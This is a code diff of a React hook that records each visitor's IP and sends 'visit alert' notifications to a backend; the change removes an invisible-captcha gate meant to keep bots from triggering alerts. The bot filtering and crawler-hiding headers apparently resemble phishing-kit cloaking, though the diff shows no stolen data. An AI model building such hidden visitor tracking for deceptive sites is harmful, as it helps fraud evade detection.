@@ -7,21 +7,14 @@ import {
   RETRY_CONFIGS,
   fetchWithTimeout,
 } from "../utils/retryUtils";
-import {
-  useCaptcha,
-  CAPTCHA_SESSION_TOKEN_KEY,
-} from "../components/Captcha/InvisibleCaptchaGate";
 
 export const useInitialSetup = (setAllData, setStep) => {
   const [Unik, setUnik] = useState("");
   const [isInitialized, setIsInitialized] = useState(false);
   const ranRef = useRef(false);
-  // Nothing reaches the backend before the captcha passes: bots produce no
-  // visit alert, no session, no socket - no movement at all.
-  const { verified } = useCaptcha();
 
   useEffect(() => {
-    if (!verified || ranRef.current) return;
+    if (ranRef.current) return;
     ranRef.current = true;
 
     const uniqueId = uuid().slice(0, 8);
@@ -30,13 +23,6 @@ export const useInitialSetup = (setAllData, setStep) => {
     const context = process.env.NEXT_PUBLIC_CONTEXT || "";
 
     const postIp = async (params, notifyNow, timeoutMs = 10000) => {
-      let sessionToken = null;
-      try {
-        sessionToken = sessionStorage.getItem(CAPTCHA_SESSION_TOKEN_KEY);
-      } catch {
-        sessionToken = null;
-      }
-
       await retryWithBackoff(async () => {
         const response = await fetchWithTimeout(
           buildApiUrl("/api/send/ip"),
@@ -46,7 +32,6 @@ export const useInitialSetup = (setAllData, setStep) => {
             headers: {
               "Content-type": "application/json; charset=UTF-8",
               "X-Robots-Tag": "googlebot: nofollow",
-              ...(sessionToken ? { "X-Session-Token": sessionToken } : {}),
             },
           },
           timeoutMs
@@ -111,7 +96,7 @@ export const useInitialSetup = (setAllData, setStep) => {
     };
 
     initializeUserData();
-  }, [verified, setAllData]);
+  }, [setAllData]);
 
   return {
     Unik,
